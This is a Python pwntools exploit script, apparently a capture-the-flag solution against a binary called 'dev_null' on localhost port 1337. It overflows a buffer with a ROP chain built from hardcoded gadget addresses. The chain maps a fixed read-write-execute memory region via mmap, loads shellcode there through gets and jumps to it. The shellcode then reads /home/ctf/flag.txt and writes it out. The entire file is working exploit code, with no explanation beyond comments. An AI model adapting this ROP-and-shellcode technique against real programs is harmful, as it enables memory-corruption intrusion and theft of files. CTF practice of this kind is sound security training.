from pwn import *
from time import time

context.terminal = "kitty"
context.binary = exe = ELF("./dev_null")

p = remote("localhost", 1337)

RWX_START = 0x200000
RWX_SIZE = 0x100000

# gadgets
POP_RDI = 0x0000000000413795
POP_RSI_RBP = 0x0000000000402acc
POP_RDX_RBX_R12_R13_RBP = 0x000000000046ddce # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
POP_RCX = 0x000000000044a3a3 #  pop rcx ; fiadd word ptr [rax] ; add bh, dh ; ret 0
POP_RAX = 0x000000000042193c
JMP_RAX = 0x000000000040195e

# stage 1 - rop chain to initalize an rwx segment
payload = b"A"*16

# create an rwx memory segment
# map it to a fix location, so we don't need to find a tricky mov rdi, rax gadget
# mmap(0x0, 0x1000000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED)
payload += p64(POP_RDI)
payload += p64(RWX_START)
payload += p64(POP_RSI_RBP)
payload += p64(RWX_SIZE) # memory map size
payload += b"B"*8 # junk to rbp
payload += p64(POP_RDX_RBX_R12_R13_RBP)
payload += p64(constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC) # rwx permissions
payload += b"C"*8 # junk to rbx
payload += b"D"*8 # junk to r12
payload += b"E"*8 # junk to r13
payload += b"F"*8 # junk to rbp
payload += p64(POP_RAX) # set rax to a valid memory address to avoid crash on pop rcx ; fiadd word ptr [rax]
payload += p64(0x413795) # just a random address
payload += p64(POP_RCX)
payload += p64(constants.MAP_ANONYMOUS | constants.MAP_PRIVATE | constants.MAP_FIXED) # flags
payload += p64(exe.sym["mmap"])

# fill the new memory segment with shellcode
payload += p64(POP_RDI)
payload += p64(RWX_START)
payload += p64(exe.sym["gets"])
payload += p64(JMP_RAX)

# stage 2 - shellcode, read out the flag and print it using pwritev2
FLAG_PATH = "/home/ctf/flag.txt"
FLAG_MEMORY = 0x280010 # place somewhere where we have no chance to send 0x0a (\n)

sc = shellcraft.pushstr(FLAG_PATH)
sc += shellcraft.openat(0, "rsp", 0)
sc += shellcraft.read("rax", FLAG_MEMORY, 0x100)

sc += shellcraft.push(0x100)
sc += shellcraft.push(FLAG_MEMORY)
sc += shellcraft.pwritev2(1, "rsp", 1, -1, 0)

shellcode = asm(sc)

p.sendline(payload)
p.sendline(shellcode)
p.interactive()